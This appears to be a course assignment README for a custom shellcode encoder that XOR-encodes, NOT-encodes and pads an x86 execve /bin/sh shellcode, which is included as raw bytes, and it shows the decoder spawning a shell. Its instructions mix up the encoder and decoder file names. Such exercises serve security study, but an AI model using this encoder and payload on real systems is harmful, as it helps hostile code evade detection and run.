# Assignment 4: Custom Encoder

Custom shellcode encoder which uses NOT encoding, XOR encryption and insertion.

To generate an encoded shellcode payload of your choice, first place the original shellcode into the `shellcode` variable of `custom_encoder.py`:

```python
#!/usr/bin/python3

# Python Custom Shellcode Encoder
# Shellcode is XOR encoded with a key of 0x7 and then NOT encoded
# Next, a random number between 1 and 100 is inserted to pad the shellcode

import random

shellcode = bytearray(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
...
```

Next, run `custom_decoder.py`:

```bash
python3 custom_decoder.py
[*] Custom decoder generated. Run ./custom_decoder to execute.
```

Finally, execute custom_encoder. The default payload decodes and runs a /bin/sh payload:

```bash
./custom_decoder
Shellcode Length:  93
#
```

---
